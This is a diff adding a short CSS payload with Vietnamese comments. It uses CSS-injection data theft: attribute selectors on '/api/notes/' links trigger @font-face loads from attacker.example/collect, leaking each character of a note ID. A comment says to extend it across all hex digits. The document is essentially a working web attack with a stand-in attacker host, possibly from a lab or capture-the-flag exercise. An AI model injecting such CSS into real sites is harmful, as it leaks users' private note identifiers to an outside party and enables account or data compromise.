@@ -1,0 +1,28 @@
+/* Nếu noteId bắt đầu bằng "0" */
+@font-face {
+  font-family: exfil0;
+  src: url("https://attacker.example/collect?char=0");
+}
+a[href^="/api/notes/0"] {
+  font-family: exfil0;
+}
+
+/* Nếu noteId bắt đầu bằng "1" */
+@font-face {
+  font-family: exfil1;
+  src: url("https://attacker.example/collect?char=1");
+}
+a[href^="/api/notes/1"] {
+  font-family: exfil1;
+}
+
+/* Nếu noteId bắt đầu bằng "a" */
+@font-face {
+  font-family: exfila;
+  src: url("https://attacker.example/collect?char=a");
+}
+a[href^="/api/notes/a"] {
+  font-family: exfila;
+}
+
+/* ... mở rộng cho toàn bộ alphabet 0-9 a-f - */
